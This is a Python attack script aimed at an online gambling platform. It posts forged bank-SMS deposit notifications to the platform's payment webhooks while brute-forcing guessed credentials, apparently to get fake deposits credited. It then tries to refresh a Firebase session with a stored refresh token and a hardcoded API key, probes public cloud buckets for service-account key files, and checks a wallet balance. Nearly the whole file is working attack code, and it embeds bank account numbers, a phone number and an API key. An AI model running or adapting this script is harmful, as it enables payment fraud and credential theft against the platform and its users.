#!/usr/bin/env python3
"""probe_webhook2.py — Webhook with correct auth model.

KEY FINDING: OkHttp client has NO custom interceptor. /webhook-kbank and /webhook-scb
authenticate entirely via username/password in the request body (C2-provisioned).

Also tries:
- GCS bucket scan for service account JSON (gsc service_account approach)
- Firebase token refresh with known/found API keys
"""
import json, pathlib, requests, time

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
BGAPI  = f"https://{TID}bgapi.asdgapicenterssdo.com"
JWT    = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
PAPDIEAW = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
FB_REFRESH = pathlib.Path("/home/kzp/claude-red/fb_refresh_token.txt").read_text().strip()

# KBANK bank account number (the platform's KBANK deposit account)
KBANK_BANK_NO = "0543753327"  # player's KBANK account
SCB_BANK_NO   = "2373102108"  # autoslip SCB account

# Deposit IDs pending approval
DEPOSIT_ID  = "30083b71-5f1a-4fa7-8309-31b2baf96427"
AUTOSLIP_BANK_ID = "18a9502b-94ae-4188-8841-094be8b3b974"

# Timestamp for this deposit (created ~2026-10-09 ~09:36+07)
TS = int(time.time())

def make_sms_body(bank, address, bank_no, username, password, amount="0"):
    """ReadSmsRequest body as used by APK."""
    return {
        "address": address,           # SMS sender ID (e.g. "SCB", "KBANK")
        "message": f"K+ 09/10/26 {time.strftime('%H:%M')} +{amount} ธนวัฒน์ พ ref K6B{TS%100000:05d}",
        "timestamp": TS,
        "bank_no": bank_no,           # Bank account number (recipient)
        "sms_id": f"{bank.lower()}_{TS}",
        "type": "deposit",
        "bank_code": bank,
        "username": username,
        "password": password,
        "amount": amount,
    }

# ── 1. Try webhook-kbank with various credentials ─────────────────────────────
print("=== POST /webhook-kbank with ReadSmsRequest body credentials ===")
base_hdrs = {"Content-Type": "application/json"}  # NO auth headers per APK analysis

cred_pairs = [
    # C2-style defaults
    ("", ""),
    ("admin", ""),
    ("admin", PAPDIEAW),
    ("admin", "admin"),
    ("admin", "Aa112233"),
    # Platform player credentials
    ("0972571110", "Aa112233"),
    ("0972571110", ""),
    # PAPDIEAW as username
    (PAPDIEAW, PAPDIEAW),
    ("lux", "lux"),
    ("luxsms", "luxsms"),
    # Known admin accounts
    ("Vak88z", "Aa112233"),
    ("vak88admin", "Aa112233"),
    # Phone number as username (platform style)
    ("admin", "123456"),
    # Likely C2 default
    ("luxino", "luxino"),
    ("service", "service"),
]

for username, password in cred_pairs:
    body = make_sms_body("KBANK", "KBANK", KBANK_BANK_NO, username, password, "100.00")
    r = requests.post(f"{MGAPI}/webhook-kbank", headers=base_hdrs, json=body, timeout=10)
    label = f"user={username or '(empty)'} pass={password[:10] if password else '(empty)'}"
    if r.status_code != 401:
        print(f"  [!!!] NON-401: {label}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  {label}: HTTP {r.status_code} (401)")

# ── 2. Also try /webhook-scb ───────────────────────────────────────────────────
print("\n=== POST /webhook-scb with body credentials ===")
for username, password in [("", ""), ("admin", "Aa112233"), ("0972571110", "Aa112233"), (PAPDIEAW, PAPDIEAW)]:
    body = make_sms_body("SCB", "SCB", SCB_BANK_NO, username, password, "100.00")
    r = requests.post(f"{MGAPI}/webhook-scb", headers=base_hdrs, json=body, timeout=10)
    label = f"user={username or '(empty)'}"
    if r.status_code != 401:
        print(f"  [!!!] NON-401: {label}: HTTP {r.status_code}: {r.text[:300]}")
    else:
        print(f"  {label}: 401")

# ── 3. Firebase token refresh (gsc approach) ──────────────────────────────────
print("\n=== Firebase token refresh (try known API keys) ===")
# The we88zz project API key might match the vak88z token's project
firebase_keys = [
    "AIzaSyAI5j8kaGDUcUDE5ZMk9Um4CneqEx-4q-s",  # we88c (known)
    # Additional guesses based on project name patterns
]
for api_key in firebase_keys:
    r = requests.post(
        f"https://securetoken.googleapis.com/v1/token?key={api_key}",
        json={"grant_type": "refresh_token", "refresh_token": FB_REFRESH},
        timeout=12
    )
    print(f"  key={api_key[:30]}...: HTTP {r.status_code}: {r.text[:200]}")
    if r.status_code == 200:
        new_token = r.json().get("id_token", "")
        print(f"  [!!!] NEW TOKEN: {new_token[:60]}...")
        pathlib.Path("/home/kzp/claude-red/fb_id_token_new.txt").write_text(new_token)

# ── 4. Check GCS public buckets for service account files ─────────────────────
print("\n=== GCS bucket scan for service account JSON ===")
buckets = ["luxino-public", "luxino-pub"]
for bucket in buckets:
    for fname in ["service-account.json", "service_account.json", "firebase-adminsdk.json",
                  "vak88z-firebase-adminsdk.json", "we88zz-firebase-adminsdk.json",
                  "firebase.json", "credentials.json", "serviceAccount.json"]:
        url = f"https://storage.googleapis.com/{bucket}/{fname}"
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            print(f"  [!!!] FOUND: {url}: {r.text[:200]}")
        else:
            print(f"  {url}: {r.status_code}")

# ── 5. Try GCS JSON listing for sa-related files ──────────────────────────────
print("\n=== GCS bucket JSON listing (service account search) ===")
for bucket in buckets:
    for prefix in ["service", "firebase", "credential", "admin"]:
        url = f"https://storage.googleapis.com/storage/v1/b/{bucket}/o?prefix={prefix}"
        r = requests.get(url, timeout=10)
        if r.ok:
            items = r.json().get("items", [])
            if items:
                for item in items:
                    print(f"  FOUND: gs://{bucket}/{item['name']} ({item.get('size', '?')} bytes)")
            else:
                print(f"  gs://{bucket}/?prefix={prefix}: empty")
        else:
            print(f"  gs://{bucket}/?prefix={prefix}: {r.status_code}")

# ── 6. Current balance check ──────────────────────────────────────────────────
print("\n=== Wallet balance ===")
r = requests.get(f"{MGAPI}/mb/wallet",
                 headers={"Authorization": f"Bearer {JWT}", "template": "vn",
                          "Content-Type": "application/json"},
                 timeout=10)
d = r.json() if r.ok else {}
print(f"  Balance: {d.get('balance', '?')}")

print("\n=== DONE ===")
